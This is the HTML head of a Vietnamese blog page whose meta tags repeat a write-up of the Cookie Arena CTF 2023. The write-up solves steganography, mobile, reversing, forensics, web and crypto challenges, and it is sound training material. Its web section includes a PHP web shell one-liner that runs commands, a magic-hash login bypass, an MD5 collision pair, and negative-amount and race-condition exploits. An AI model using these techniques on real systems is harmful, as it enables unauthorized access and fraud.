<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Cookie Arena CTF 2023</title>
  <meta name="description" content="Table of Contents  0x00 Giới thiệu  0x01 Stenography          Cutie K1tty        0x02 Mobile          Cat Me      Pinned Cookie        0x03 Reverse          ...">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://localhost:4000/2023/07/10/Cookiehanhoan.html">
  <link rel="alternate" type="application/rss+xml" title="George Do" href="http://localhost:4000/feed.xml">
  <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Cookie Arena CTF 2023 | George Do</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Cookie Arena CTF 2023" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Table of Contents 0x00 Giới thiệu 0x01 Stenography Cutie K1tty 0x02 Mobile Cat Me Pinned Cookie 0x03 Reverse Pyreverse Jump Rev1 0x04 Forensic Sổ đăng ký Tin học văn phòng cơ bản 0x05 Web Magic Login Magic Login Harder Be Positive Slow Down 0x06 Crypto Basic Operator 0x00 Giới thiệu Hai ngày cuối tuần, mình cùng một số anh em trong câu lạc bộ chơi giải Cookie Arena CTF 2023. Cuộc thi được diễn ra liên tục trong 48 giờ. Chắc do bị DDOS bất ngờ, đáng lẽ cuộc thi được bắt đầu từ 21h nhưng phải hoãn lại. Sang tới tận ngày hôm sau chúng mình mới có thể chơi bình thường. Đây là lần đầu tiên mình tham gia trọn vẹn một kỳ thi CTF online. Cuộc thi diễn ra theo hình thức cá nhân, nhưng bọn mình lại chơi cùng nhau. Kết quả cả đội đứng thứ 6 chung cuộc nhưng sẽ không viết writeup và nhận quà từ ban tổ chức do vi phạm quy định hehe. Dưới đây là bài giải cho một số bài mình làm được trong cuộc thi và sau khi có được hướng dẫn từ các anh chị khác. 0x01 Stenography Cutie K1tty Description Một chú mèo cute chứa đựng nhiều điều bí ẩn. Hãy tìm ra điều thú vị đó. Tải challenge: CutieK1tty (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài toán cho chúng ta hình ảnh một con mèo Như thường lệ, mình sẽ kiểm tra bức ảnh này có ẩn dấu những cụm từ nào đáng chú ý hay không $ strings cut3_c4t.png y0u_4r3_cl0s3.rar Cat! f1n4lly.txt Chúng ta thấy có khá nhiều từ khả nghi ở đây. mình sẽ thử chuyển file png này thành file zip để xem có thể khai thác được gì không. Khi giải nén ra, ta thu được 2 file mới là purrr_2.mp3 và y0u_4r3_cl0s3.rar. Tiếp tục giải nén file y0u_4r3_cl0s3.rar, xuất hiện thông báo lỗi Đưa file này vào HxD để kiểm tra các magic byte, phát hiện ra file đã bị corrupt do header của nó là Cat. Ở đây, chúng ta chỉ cần sửa header lại thành Rar là có thể giải nén được. Nhận thấy còn file purrr_2.mp3 chưa được sử dụng. Khả năng cao nó chứa password của file rar ở trên. Sử dụng tool Audacity, ta có được sp3ctrum_1s_y0ur_fr13nd là password để giải nén. Đến đây, chúng ta chỉ cần decode base64 quen thuộc sẽ tìm ra được flag atob(&quot;ZjByM241MWNzX21hNXQzcg==&quot;) &#39;f0r3n51cs_ma5t3r&#39; Flag: CHH{f0r3n51cs_ma5t3r} 0x02 Mobile Cat Me Description Với người dùng bình thường, họ không thể nhìn thấy gì. Nhưng hacker thì họ luôn có cách khác. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên Tải challenge: Cat Me (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Dùng jadx để decompile file apk. Sử dụng search để tìm các cụm từ khả nghi. Khi search từ khóa flag, chúng ta thấy có đoạn mã sau khả nghi. Copy hết các ký tự trong arrayList, nhận thấy rằng đây là base64. import base64 flag = &quot;Q0hIe00wcmVfMW43RVIzU1RJTjlfN2gxTjZfMU5fbG9nY2F0fQ==&quot; flag = base64.b64decode(flag) print(flag) Flag: CHH{M0re_1n7ER3STIN9_7h1N6_1N_logcat} Pinned Cookie Description Một kết nối cực an toàn giữa người dùng và server đã được thiết lập. Kẻ tấn công không thể đứng giữa để nghe ngóng thông tin. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên Tải challenge: Pinned Cookie (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Quan sát trong jadx, chúng ta thấy có hàm MainActivity Nhìn tổng quan hàm, chúng ta lại thấy đoạn code arrayList quen thuộc giống như bài Cat Me. Ở đây, xuất hiện thêm một chuỗi lạ là “sTroN6PaSswORD”. Tiếp tục đi sâu vào từng hàm có liên quan tới chuỗi này. Chúng ta tìm thấy một hàm khả nghi Nội dung chính của hàm y0 này là đi decode chuỗi base64 thu được từ arrayList, tiếp đến xor từng byte một với chuỗi ký tự “sTroN6PaSswORD”. import base64 key = b&#39;sTroN6PaSswORD&#39; base64_str = b&#39;MBw6FDdZBT4wRzkQMB0jYEc8EUUDLQwjPiE8LR0TDw==&#39; bytesFlag = base64.b64decode(base64_str) flag = &quot;&quot; for i in range(len(bytesFlag)): flag += chr(bytesFlag[i] ^ key[i % len(key)]) print(flag) Flag: CHH{yoU_c4N_bYP45S_sSL_PInninG} 0x03 Reverse Pyreverse Description Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong. Tải challenge: Pyreverse (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Sử dụng Detect It Easy, kiểm tra file .exe được pack bằng PyInstaller. Tới đây, mình sử dụng công cụ pyinstxtractor để unpack lại file .py ban đầu. Sau khi thu được file pyreverser.pyc, mình tiếp tục lên CTFever để decompile file .pyc thành .py ban đầu. # Decompiled on CTFever Premium # Decompile engine: Decompyle++ (pycdc) # Python version: 3.10 import base64 def reverse_string(s): return s[::-1] def scramble_flag(flag): scrambled = &#39;&#39; for i, char in enumerate(flag): if i % 2 == 0: scrambled += chr(ord(char) + 1) continue scrambled += chr(ord(char) - 1) return scrambled def main(): secret_flag = scramble_flag(reverse_string(base64.b64decode(&#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&#39;)).decode()) print(&#39;Welcome to PyReverser!&#39;) print(&#39;Please enter a word or phrase:&#39;) user_input = input() generated_value = scramble_flag(reverse_string(user_input.upper())) print(&#39;Generated value:&#39;, generated_value) print(&#39;Can you find the hidden flag?&#39;) reversed_flag = reverse_string(secret_flag) print(&#39;Reversed flag:&#39;, reversed_flag) if __name__ == &#39;__main__&#39;: main() # return None Dễ dàng decode base64 đoạn mã Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==, chúng ta sẽ có được flag. atob(&quot;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==&quot;) &#39;Flag: CHH{python2Exi_Reverse_ENginering}&#39; Flag: CHH{python2Exi_Reverse_ENginering} Jump Description Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong. Tải challenge: Jump (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài toán cho chúng ta một file jump.exe. Bỏ file này vào IDAPRO 32, chúng ta thấy được đoạn mã giả của hàm main. Nhiệm vụ của hàm main là cho nhập giá trị vào biến jump rồi nhảy đến địa chỉ đó. Vì vậy, chúng ta chỉ cần nhảy đến địa chỉ hàm _flag là có thể lấy được flag. Lưu ý: 0x00401500 = 4199680 Flag: CHH{JUMP_T0_TH3_M00N} Rev1 Description Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong. Tải challenge: Rev1 (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài này mình không biết debug nên mình lấy luôn code của các bạn đã writeup. debug055:02760002 movzx eax, byte ptr [edi+ecx] debug055:02760006 imul eax, 6Eh ; &#39;n&#39; debug055:02760009 inc ecx debug055:0276000A movzx edx, byte ptr [edi+ecx] debug055:0276000E imul edx, 1C3h debug055:02760014 add eax, edx debug055:02760016 inc ecx debug055:02760017 movzx edx, byte ptr [edi+ecx] debug055:0276001B imul edx, 348h debug055:02760021 add eax, edx debug055:02760023 inc ecx debug055:02760024 movzx edx, byte ptr [edi+ecx] debug055:02760028 imul edx, 1F8h debug055:0276002E add eax, edx debug055:02760030 inc ecx debug055:02760031 movzx edx, byte ptr [edi+ecx] debug055:02760035 imul edx, 357h debug055:0276003B sub eax, edx debug055:0276003D inc ecx debug055:0276003E movzx edx, byte ptr [edi+ecx] debug055:02760042 imul edx, 46h ; &#39;F&#39; debug055:02760045 add eax, edx debug055:02760047 inc ecx debug055:02760048 movzx edx, byte ptr [edi+ecx] debug055:0276004C imul edx, 16Fh debug055:02760052 sub eax, edx debug055:02760054 inc ecx debug055:02760055 movzx edx, byte ptr [edi+ecx] debug055:02760059 imul edx, 2FEh debug055:0276005F sub eax, edx debug055:02760061 inc ecx debug055:02760062 movzx edx, byte ptr [edi+ecx] debug055:02760066 imul edx, 17Ah debug055:0276006C add eax, edx debug055:0276006E inc ecx debug055:0276006F movzx edx, byte ptr [edi+ecx] debug055:02760073 imul edx, 15Ah debug055:02760079 add eax, edx debug055:0276007B inc ecx debug055:0276007C movzx edx, byte ptr [edi+ecx] debug055:02760080 imul edx, 326h debug055:02760086 sub eax, edx debug055:02760088 inc ecx debug055:02760089 movzx edx, byte ptr [edi+ecx] debug055:0276008D imul edx, 190h debug055:02760093 sub eax, edx debug055:02760095 inc ecx debug055:02760096 movzx edx, byte ptr [edi+ecx] debug055:0276009A imul edx, 129h debug055:027600A0 add eax, edx debug055:027600A2 inc ecx debug055:027600A3 movzx edx, byte ptr [edi+ecx] debug055:027600A7 imul edx, 2EDh debug055:027600AD add eax, edx debug055:027600AF inc ecx debug055:027600B0 movzx edx, byte ptr [edi+ecx] debug055:027600B4 cmp eax, 29CBh Đến đây, bài toán đưa về việc giải hệ phương trình 14 phương trình, 14 ẩn. Để giải hệ phương trình này, các bạn có thể giải tay bằng những kiến thức đã được học trong môn ĐSTT haha. Còn mình sẽ sử dụng Z3 để giải quyết bài toán này. from z3 import * solver = Solver() v = [BitVec(f&#39;x{i}&#39;, 32) for i in range(14)] equations = [ 0x6E * v[0] + 0x1C3 * v[1] + 0x348 * v[2] + 0x1F8 * v[3] - 0x357 * v[4] + 0x46 * v[5] - 0x16F * v[6] - 0x2FE * v[7] + 0x17A * v[8] + 0x15A * v[9] - 0x326 * v[10] - 0x190 * v[11] + 0x129 * v[12] + 0x2ED * v[13] == 0x29CB, 0x2A * v[0] + 0x3B2 * v[1] + 0x2C1 * v[2] + 0x23A * v[3] - 0x3D1 * v[4] + 0x152 * v[5] + 0x221 * v[6] - 0x2FC * v[7] - 0x0DF * v[8] - 0x36F * v[9] + 0x1A2 * v[10] + 0x179 * v[11] + 0x284 * v[12] - 0x64 * v[13] == 0x0F0ED, 0x328 * v[0] + 0x3CD * v[1] + 0x3CC * v[2] + 0x329 * v[3] + 0x0EA * v[4] - 0x1A * v[5] + 0x12B * v[6] - 0x2E * v[7] - 0x337 * v[8] + 0x262 * v[9] + 0x37 * v[10] - 0x0A4 * v[11] + 0x383 * v[12] + 0x2D5 * v[13] == 0x66098, 0x66 * v[0] - 0x3C9 * v[1] - 0x0C0 * v[2] - 0x0BD * v[3] - 0x9D * v[4] + 0x2D1 * v[5] - 0x299 * v[6] + 0x38E * v[7] + 0x15 * v[8] - 0x14E * v[9] + 0x280 * v[10] + 0x0E1 * v[11] - 0x128 * v[12] + 0x50 * v[13] == 0x6CE4, 0x2ED * v[0] + 0x8A * v[1] - 0x155 * v[2] - 0x8C * v[3] - 0x239 * v[4] + 0x259 * v[5] - 0x286 * v[6] - 0x1DA * v[7] + 0x154 * v[8] - 0x196 * v[9] + 0x97 * v[10] + 0x26D * v[11] + 0x3E0 * v[12] - 0x1EB * v[13] == 0x150DD, 0x46 * v[0] - 0x2DF * v[1] + 0x243 * v[2] + 0x78 * v[3] - 0x0EE * v[4] + 0x99 * v[5] - 0x0C5 * v[6] - 0x0EB * v[7] - 0x0AE * v[8] + 0x28F * v[9] - 0x65 * v[10] + 0x20B * v[11] - 0x147 * v[12] + 0x3C2 * v[13] == 0x1E68B, 0x264 * v[0] + 0x2BE * v[1] + 0x3B5 * v[2] - 0x1D3 * v[3] - 0x8 * v[4] - 0x150 * v[5] + 0x3C1 * v[6] - 0x3E4 * v[7] - 0x58 * v[8] - 0x19C * v[9] + 0x3AA * v[10] + 0x261 * v[11] - 0x17F * v[12] - 0x167 * v[13] == 0x18490, 0x0B3 * v[0] - 0x63 * v[1] - 0x0E0 * v[2] + 0x24 * v[3] + 0x37C * v[4] + 0x0AA * v[5] + 0x33 * v[6] - 0x11E * v[7] - 0x13D * v[8] + 0x139 * v[9] + 0x3DC * v[10] - 0x14C * v[11] + 0x2DD * v[12] + 0x2B3 * v[13] == 0x3CC54, 0x102 * v[0] + 0x115 * v[1] + 0x0D3 * v[2] + 0x0DC * v[3] + 0x3A1 * v[4] - 0x35C * v[5] - 0x0ED * v[6] + 0x141 * v[7] - 0x19C * v[8] - 0x2B6 * v[9] + 0x3CC * v[10] + 0x3AA * v[11] + 0x24B * v[12] + 0x1B9 * v[13] == 0x45670, 0x3C4 * v[0] + 0x305 * v[1] - 0x0A9 * v[2] + 0x87 * v[3] - 0x0E6 * v[4] + 0x30 * v[5] + 0x20F * v[6] - 0x3D0 * v[7] - 0x94 * v[8] - 0x2CC * v[9] + 0x56 * v[10] + 0x224 * v[11] + 0x1B5 * v[12] + 0x183 * v[13] == 0x21A0F, 0x256 * v[0] + 0x157 * v[1] + 0x181 * v[2] - 0x306 * v[3] - 0x243 * v[4] - 0x9 * v[5] - 0x373 * v[6] - 0x1A3 * v[7] + 0x223 * v[8] + 0x200 * v[9] - 0x365 * v[10] - 0x56 * v[11] + 0x1B6 * v[12] - 0x39C * v[13] == 0x0FFFE3896, 0x0A3 * v[0] + 0x2B2 * v[1] + 0x22D * v[2] + 0x3D6 * v[3] - 0x9A * v[4] - 0x76 * v[5] - 0x2A0 * v[6] + 0x63 * v[7] + 0x373 * v[8] + 0x15 * v[9] - 0x3B9 * v[10] + 0x214 * v[11] - 0x232 * v[12] + 0x225 * v[13] == 0x22874, 0x151 * v[0] + 0x153 * v[1] + 0x25F * v[2] - 0x187 * v[3] - 0x2AC * v[4] + 0x1CC * v[5] - 0x155 * v[6] - 0x2F5 * v[7] - 0x22D * v[8] + 0x17B * v[9] - 0x377 * v[10] - 0x0B2 * v[11] - 0x294 * v[12] - 0x2CE * v[13] == 0x0FFFBEC4D, 0x2AA * v[0] + 0x95 * v[1] + 0x83 * v[2] + 0x25B * v[3] - 0x77 * v[4] - 0x2E1 * v[5] + 0x39D * v[6] + 0x251 * v[7] + 0x0A2 * v[8] - 0x27D * v[9] + 0x268 * v[10] + 0x2F9 * v[11] + 0x14 * v[12] - 0x115 * v[13] == 0x3C5E6 ] for equation in equations: solver.add(equation) if solver.check() == sat: model = solver.model() solution = [model.evaluate(i).as_long() for i in v] print(f&#39;{solution}&#39;) else: print(&quot;No solution&quot;) flag = &quot;&quot; for i in solution: flag += chr(i) print(flag) Key: q20OK36QBiWkZT Flag: CHH{COOk13_4R3n4} 0x04 Forensic Sổ đăng ký Description Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack. Tải challenge: Sổ đăng ký (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài toán này, chúng ta nhận được file NTUSER.DAT. Mở file bằng tool Registry Finder, tìm những từ khóa như cmd.exe, powershell.exe để xem có thể khai thác được thông tin gì không. Chúng ta thu được một đoạn shell code khả nghi. Nhận thấy có mã hóa base64. Chúng ta đem lên CyberChef để giải mã và thu được flag. Flag: CHH{N0_4_go_n0_st4r_wh3r3} Tin học văn phòng cơ bản Description Sau khi tham gia một khóa Tin học văn phòng cơ bản, Hòa đã có thể tự tạo một tệp tài liệu độc hại và anh ta có ý định sẽ dùng nó để hack cả thế giới Tải challenge: Tin học văn phòng cơ bản (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Chúng ta sử dụng tool olevba để kiểm tra các macro VBA. Flag: CHH{If_u_w4nt_1_will_aft3rnull_u} 0x05 Web Magic Login Description Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong /flag.txt hãy tìm cách đọc được chúng. Format Flag: CHH{XXX} Solution Để giải quyết bài toán này, password sau khi hash sha256 phải bằng 0. Những hash này đều có điểm chung là bắt đầu bằng 0e. Lên https://github.com/spaze/hashes, chọn một password tùy thích. Đăng nhập với password = TyNOQHUS. Đến đây, chúng ta chỉ cần upload shell đơn giản. &lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt; Flag: CHH{PHP_m4g1c_tr1ck_0lD_but_g0lD_ec3f73ad46f1da5e1f1931a0bb288e0c} Magic Login Harder Description Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong /flagXXX.txt hãy tìm cách đọc được chúng. FLAG=$(cat /dev/urandom | tr -dc &#39;a-zA-Z0-9&#39; | fold -w 5 | head -n 1) cp /flag.txt /flag$FLAG.txt Tải challenge: Magic Login Harder (pass: cookiehanhoan) Format Flag: CHH{XXX} Solution &lt;?php if(isset($_POST[&quot;submit&quot;])){ $username = base64_decode($_POST[&#39;username&#39;]); $password = base64_decode($_POST[&#39;password&#39;]); if(($username == $password)){ echo &#39;Username and password are not the same&#39;; } else if((md5($username)===md5($password))){ $_SESSION[&#39;username&#39;] = $username; header(&#39;Location: admin.php?file=1.txt&#39;); } else { echo &#39;Username and password are wrong&#39;; } } ?&gt; Để giải quyết bài toán này, chúng ta phải đi tìm 2 chuỗi username và password khác nhau nhưng đều có cùng giá trị MD5. Hướng khai thác MD5 Collision Chỉ cần lên Google, search một chút về vấn đề này, chúng ta có được kết quả khá ưng ý. Can two different strings generate the same MD5 hash code? MD5 Collision Demo import hashlib import base64 x = &#39;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#39; y = &#39;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#39; x = bytes.fromhex(x) y = bytes.fromhex(y) print(x == y, hashlib.md5(x).hexdigest() == hashlib.md5(y).hexdigest()) x = base64.b64encode(x) y = base64.b64encode(y) print(x) print(y) # x = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+og== # y = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+og== Login thành công với cặp (x, y) thu được ở trên. Sau đó chuyển qua trang admin.php để xử lý tiếp bài toán. Be Positive Description Libra Dnuf Marketplace Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob. After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal. To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state. Solution Từ tên bài toán và là bài web dễ nhất trong đề. Khả năng cao bài toán sẽ có lỗ hổng chuyển tiền âm. Vào tab Transfer, chỉnh sửa giá trị min = -99999 rồi chuyển tiền cho Bob với số tiền là -2000. Bây giờ, chúng ta đã có dư tiền để mua flag. Flag: CHH{BE_cAr3fUL_WitH_NE6ATIV3_NumBeR_a2c3d35c666e930911bfb0777e1e93ae} Slow Down Description Libra Dnuf Marketplace Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob. After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal. To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state. Solution Ở bài toán này, cấu trúc tương tự như bài Be Positive nhưng đã bị filter số âm. Nhận thấy, phản hồi chuyển tiền thành công về khá lâu, cộng thêm tên bài toán là Slow Down. Từ đấy, mình nghĩ hướng xử lý bài toán liên quan tới Race Condition. Sử dụng 2 trình duyệt khác nhau, cùng login với tài khoản Alice và chuyển tiền đến Bob. Flag: CHH{ea5y_RaCe_CONd17iOn_e84d1b098a499d032afe243ab64dd49a} 0x06 Crypto Basic Operator Description Sử dụng kiến thức toán học và cấu trúc đại số để giải mã flag Tải challenge: Basic Operator (pass: cookiehanhoan) Solution from Crypto.Util import number def padding_pkcs7(data,block_size=4): tmp = len(data) + (block_size - len(data) % block_size) return data.ljust(tmp,bytes([block_size-(len(data)%block_size)])) def split_block(data,block_size): return list(int.from_bytes(data[i:i+block_size],&#39;little&#39;) for i in range(0,len(data),block_size)) def plus_func(data,shift): return (data+shift)&amp;0xffffffff def mul_func(data,mul): return (data*mul)&amp;0xffffffff def xor_shift_right_func(data,bit_loc): return (data^(data&gt;&gt;bit_loc))&amp;0xffffffff def pow_func(data,e,p): return pow(data,e,p) def exp_func(data,base,p): return pow(base,data,p) def ecb_mode(data): return list(pow_func(exp_func(xor_shift_right_func(mul_func(plus_func(block,3442055609),2898124289),1),e,p),e,p) for block in split_block(padding_pkcs7(data,4),4)) if __name__==&#39;__main__&#39;: p = 1341161101353773850779 e = 2 mess = b&#39;CHH{CENSORED}&#39; cipher_flag = ecb_mode(mess) print(cipher_flag) Nhận thấy bài toán mã hóa từng block 4 byte một. Vì vậy, chúng ta hoàn toàn có thể brute-force các kí tự để đoán từng block một. Để giải quyết bài toán này, chúng ta có hai cách để giải: Brute-force từng block một như đã phân tích ở trên Dựng ngược lại các hàm đã cho để đi tìm flag Cách giải 1. Nhận thấy rằng Cipher có 12 block, với 4 chữ cái đầu tiên của flag sẽ là “CHH{“. Quan sát kết quả mã hóa block đầu tiên này và so sánh với Cipher, ta khẳng định được: Block đầu tiên của flag là “CHH{“ Block cuối cùng của flag có 1, 2 hoặc 3 kí tự. Vậy các trường hợp có thể xảy ra là: b’}\x03\x03\x03’ b’x}\x02\x02’ b’xx}\x01’ from tqdm import tqdm from string import printable def padding_pkcs7(data,block_size=4): tmp = len(data) + (block_size - len(data) % block_size) return data.ljust(tmp,bytes([block_size-(len(data)%block_size)])) def split_block(data,block_size): return list(int.from_bytes(data[i:i+block_size],&#39;little&#39;) for i in range(0,len(data),block_size)) def plus_func(data,shift): return (data+shift)&amp;0xffffffff def mul_func(data,mul): return (data*mul)&amp;0xffffffff def xor_shift_right_func(data,bit_loc): return (data^(data&gt;&gt;bit_loc))&amp;0xffffffff def pow_func(data,e,p): return pow(data,e,p) def exp_func(data,base,p): return pow(base,data,p) def ecb_mode(data): return list(pow_func(exp_func(xor_shift_right_func(mul_func(plus_func(block,3442055609),2898124289),1),e,p),e,p) for block in split_block(padding_pkcs7(data,4),4)) p = 1341161101353773850779 e = 2 Cipher = [752589857254588976778, 854606763225554935934, 102518422244000685572, 779286449062901931327, 424602910997772742508, 1194307203769437983433, 501056821915021871618, 691835640758326884371, 778501969928317687301, 1260460302610253211574, 833211399330573153864, 223847974292916916557] def brute(index): if index != 11: for x in tqdm(range(len(printable))): for y in tqdm(range(len(printable))): for z in range(len(printable)): for t in range(len(printable)): flag = (printable[x] + printable[y] + printable[z] + printable[t]).encode() if ecb_mode(flag)[0] == Cipher[index]: print(flag) exit() else: # b&#39;}\x03\x03\x03&#39; # b&#39;x}\x02\x02&#39; # b&#39;xx}\x01&#39; for x in tqdm(range(len(printable))): for y in range(len(printable)): flag = (printable[x] + printable[y] + &#39;}&#39;).encode() if ecb_mode(flag)[0] == Cipher[index]: print(flag) exit() flag = (printable[y] + &#39;}&#39;).encode() if ecb_mode(flag)[0] == Cipher[index]: print(flag) exit() if __name__ == &#39;__main__&#39;: for i in range(12): brute(i) Flag: CHH{w3lc0m3_70_7h3_m47h_w0rld(1_h4t3_1t_th3r3)}" />
<meta property="og:description" content="Table of Contents 0x00 Giới thiệu 0x01 Stenography Cutie K1tty 0x02 Mobile Cat Me Pinned Cookie 0x03 Reverse Pyreverse Jump Rev1 0x04 Forensic Sổ đăng ký Tin học văn phòng cơ bản 0x05 Web Magic Login Magic Login Harder Be Positive Slow Down 0x06 Crypto Basic Operator 0x00 Giới thiệu Hai ngày cuối tuần, mình cùng một số anh em trong câu lạc bộ chơi giải Cookie Arena CTF 2023. Cuộc thi được diễn ra liên tục trong 48 giờ. Chắc do bị DDOS bất ngờ, đáng lẽ cuộc thi được bắt đầu từ 21h nhưng phải hoãn lại. Sang tới tận ngày hôm sau chúng mình mới có thể chơi bình thường. Đây là lần đầu tiên mình tham gia trọn vẹn một kỳ thi CTF online. Cuộc thi diễn ra theo hình thức cá nhân, nhưng bọn mình lại chơi cùng nhau. Kết quả cả đội đứng thứ 6 chung cuộc nhưng sẽ không viết writeup và nhận quà từ ban tổ chức do vi phạm quy định hehe. Dưới đây là bài giải cho một số bài mình làm được trong cuộc thi và sau khi có được hướng dẫn từ các anh chị khác. 0x01 Stenography Cutie K1tty Description Một chú mèo cute chứa đựng nhiều điều bí ẩn. Hãy tìm ra điều thú vị đó. Tải challenge: CutieK1tty (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài toán cho chúng ta hình ảnh một con mèo Như thường lệ, mình sẽ kiểm tra bức ảnh này có ẩn dấu những cụm từ nào đáng chú ý hay không $ strings cut3_c4t.png y0u_4r3_cl0s3.rar Cat! f1n4lly.txt Chúng ta thấy có khá nhiều từ khả nghi ở đây. mình sẽ thử chuyển file png này thành file zip để xem có thể khai thác được gì không. Khi giải nén ra, ta thu được 2 file mới là purrr_2.mp3 và y0u_4r3_cl0s3.rar. Tiếp tục giải nén file y0u_4r3_cl0s3.rar, xuất hiện thông báo lỗi Đưa file này vào HxD để kiểm tra các magic byte, phát hiện ra file đã bị corrupt do header của nó là Cat. Ở đây, chúng ta chỉ cần sửa header lại thành Rar là có thể giải nén được. Nhận thấy còn file purrr_2.mp3 chưa được sử dụng. Khả năng cao nó chứa password của file rar ở trên. Sử dụng tool Audacity, ta có được sp3ctrum_1s_y0ur_fr13nd là password để giải nén. Đến đây, chúng ta chỉ cần decode base64 quen thuộc sẽ tìm ra được flag atob(&quot;ZjByM241MWNzX21hNXQzcg==&quot;) &#39;f0r3n51cs_ma5t3r&#39; Flag: CHH{f0r3n51cs_ma5t3r} 0x02 Mobile Cat Me Description Với người dùng bình thường, họ không thể nhìn thấy gì. Nhưng hacker thì họ luôn có cách khác. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên Tải challenge: Cat Me (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Dùng jadx để decompile file apk. Sử dụng search để tìm các cụm từ khả nghi. Khi search từ khóa flag, chúng ta thấy có đoạn mã sau khả nghi. Copy hết các ký tự trong arrayList, nhận thấy rằng đây là base64. import base64 flag = &quot;Q0hIe00wcmVfMW43RVIzU1RJTjlfN2gxTjZfMU5fbG9nY2F0fQ==&quot; flag = base64.b64decode(flag) print(flag) Flag: CHH{M0re_1n7ER3STIN9_7h1N6_1N_logcat} Pinned Cookie Description Một kết nối cực an toàn giữa người dùng và server đã được thiết lập. Kẻ tấn công không thể đứng giữa để nghe ngóng thông tin. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên Tải challenge: Pinned Cookie (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Quan sát trong jadx, chúng ta thấy có hàm MainActivity Nhìn tổng quan hàm, chúng ta lại thấy đoạn code arrayList quen thuộc giống như bài Cat Me. Ở đây, xuất hiện thêm một chuỗi lạ là “sTroN6PaSswORD”. Tiếp tục đi sâu vào từng hàm có liên quan tới chuỗi này. Chúng ta tìm thấy một hàm khả nghi Nội dung chính của hàm y0 này là đi decode chuỗi base64 thu được từ arrayList, tiếp đến xor từng byte một với chuỗi ký tự “sTroN6PaSswORD”. import base64 key = b&#39;sTroN6PaSswORD&#39; base64_str = b&#39;MBw6FDdZBT4wRzkQMB0jYEc8EUUDLQwjPiE8LR0TDw==&#39; bytesFlag = base64.b64decode(base64_str) flag = &quot;&quot; for i in range(len(bytesFlag)): flag += chr(bytesFlag[i] ^ key[i % len(key)]) print(flag) Flag: CHH{yoU_c4N_bYP45S_sSL_PInninG} 0x03 Reverse Pyreverse Description Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong. Tải challenge: Pyreverse (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Sử dụng Detect It Easy, kiểm tra file .exe được pack bằng PyInstaller. Tới đây, mình sử dụng công cụ pyinstxtractor để unpack lại file .py ban 